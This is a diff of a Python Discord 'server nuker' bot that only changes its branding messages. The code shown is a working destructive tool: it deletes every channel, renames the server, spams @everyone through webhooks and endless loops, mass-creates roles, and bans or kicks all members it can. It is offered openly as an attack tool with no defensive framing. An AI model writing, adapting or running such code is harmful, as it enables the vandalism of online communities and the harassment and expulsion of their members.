@@ -73,7 +73,7 @@ async def nuke(ctx):
     Nuke the server.
     """
     await ctx.message.delete()
-    await ctx.guild.edit(name="Severity Was Here")
+    await ctx.guild.edit(name="Ur Worst Nightmare Was Here")
 
     await asyncio.gather(*[channel.delete() for channel in ctx.guild.channels])
 
@@ -84,7 +84,7 @@ async def nuke(ctx):
         for _ in range(num_webhooks):
             webhook = await channel.create_webhook(name=f"Severity{_}") 
             for _ in range(5):
-                await webhook.send(f"@everyone **Severity Was Here!** https://guns.lol/hooked/")       
+                await webhook.send(f"@everyone **Ur Worst Nightmare Was Here!** https://guns.lol/hooked/")       
                 await ctx.send("Nuking the server...")  
 
 @bot.event
@@ -102,7 +102,7 @@ async def on_command_error(ctx, error):
 @bot.event
 async def on_guild_channel_create(channel):
     while True:
-        await channel.send("@everyone star the fucking repository https://github.com/severityc/Discord-Server-Nuker , https://guns.lol/hooked/")
+        await channel.send("@everyone Ur Worst Nightmare!")
 
 
 @bot.command()
@@ -113,7 +113,7 @@ async def rolespam(ctx):
     """
     await ctx.message.delete()
     for i in range(100):
-        await ctx.guild.create_role(name="wizzed by severity")
+        await ctx.guild.create_role(name="wizzez by someone haha")
     """
     Spam roles in the server.
     """
@@ -138,7 +138,7 @@ async def banall(ctx):
     try:
         for member in ctx.guild.members:
             if ctx.author.guild_permissions.ban_members and not member.guild_permissions.ban_members:
-                await member.ban(reason="Severity Was Here")
+                await member.ban(reason="Ur worst nightmare Was Here")
                 print(Fore.GREEN + f"banned {member}")
             else:
                 print(Fore.RED + f"skipping {member} due to permissions")
@@ -157,7 +157,7 @@ async def kickall(ctx):
     """
     try:
         for member in ctx.guild.members:
-            await member.kick(reason="Severity Was Here")
+            await member.kick(reason="Ur worst nightmare Was Here")
             print(Fore.GREEN + f"kicked {member}")
     except:
         print(Fore.RED + f"cant kick {member}")
